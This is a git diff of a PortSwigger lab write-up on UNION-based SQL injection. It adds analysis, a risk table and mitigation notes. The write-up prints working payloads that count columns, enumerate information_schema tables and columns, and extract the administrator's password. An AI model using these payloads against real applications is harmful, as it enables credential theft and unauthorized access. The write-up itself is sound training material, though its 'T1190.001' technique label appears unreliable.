@@ -1,4 +1,4 @@
-# SQL Injection - UNION Attack: querying the database type and version on MySQL and Microsoft
+# SQL Injection - UNION Attack: Listing Database Contents
 
 ## Goal:
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
@@ -9,41 +9,50 @@ To solve the lab, log in as the `administrator` user.
 
 ---
 
-## Process
+## Vulnerability Analysis
 
-### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
-```http
-GET /filter?category=Corporate+gifts HTTP/2
-```
+### Attack Vector Identification
+- **Entry Point**: `category` parameter in GET request
+- **Vulnerability Type**: T1190.001 - SQL Injection: Database Enumeration (CWE-89)
+- **Security Flaw:** User input is embedded directly into SQL queries
 
-### 2. Modified the Request to Determine Column Count
+### Vulnerability Assessment & Exploitation
+
+**Initial Approach:**
+- Intercepted HTTP requests using Burp Suite
+- Identified category parameter as potential injection point
+- Performed systematic input validation testing
+
+**Step 1: Determining Column Count**
 
 ```sql
 ' UNION SELECT NULL--
 ```
-Response: HTTP/2 500 Internal Server
+Response: HTTP/2 500 Internal Server Error
 
 ```sql
 ' UNION SELECT NULL,NULL--
 ```
 Response: HTTP/2 200 OK
 
-### 3. Identified Column Accepting String Output
+**Step 2: Identifying String-Compatible Columns**
 
 ```sql
 ' UNION SELECT 'a','a'--
 ```
 Response: HTTP/2 200 OK
 
-### 4. Retrieved the table names and column names
+**Step 3: Enumerating Database Tables**
 
 ```sql
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```
 
+![burpsuite response](./misc-images/08-1.png)
+
 This displayed several tables within the database including users_omjluk.
 
-![burpsuite response](./misc-images/08-1.png)
+**Step 4: Enumerating Table Columns**
 
 ```sql
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_omjluk'--
@@ -51,7 +60,7 @@ This displayed several tables within the database including users_omjluk.
 
 ![burpsuite response](./misc-images/08-2.png)
 
-### 5. Retrieved the password of 'administrator'
+**Step 5: Retrieving Administrator Credentials**
 
 ```sql
 ' UNION SELECT username_wondnj,password_czpiww FROM users_omjluk WHERE username_wondnj='administrator'--
@@ -63,19 +72,35 @@ Logged in as the administrator using the password retrieved.
 
 ---
 
+## Security Assessment
+
+### Root Cause Analysis
+- Application concatenates user input directly into SQL queries
+- No input validation or sanitization implemented
+- Parameterized queries (prepared statements) are not used
+
+### Risk Assessment
+| Category | Impact |
+|----------|--------|
+| Confidentiality | High – Sensitive user data exposed |
+| Authentication | High – Credentials leaked |
+| Information Disclosure | High – Complete database structure revealed |
+
+---
+
 ## Mitigation
 
-- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
+- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
 
-Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)
+Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#mitigation)
 
-- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.
+- Restrict database permissions using the principle of least privilege.
 
 ---
 
 ## Reflection
 
-Learned how to retrieve table and column names from "information schema".
+This lab demonstrated how to enumerate database contents using `UNION-based` SQL injection. The `information_schema` queries proved highly effective in discovering table and column names. Learned the importance of understanding database metadata structures and the critical need for proper access controls to prevent unauthorized database enumeration.
 
 ---
 
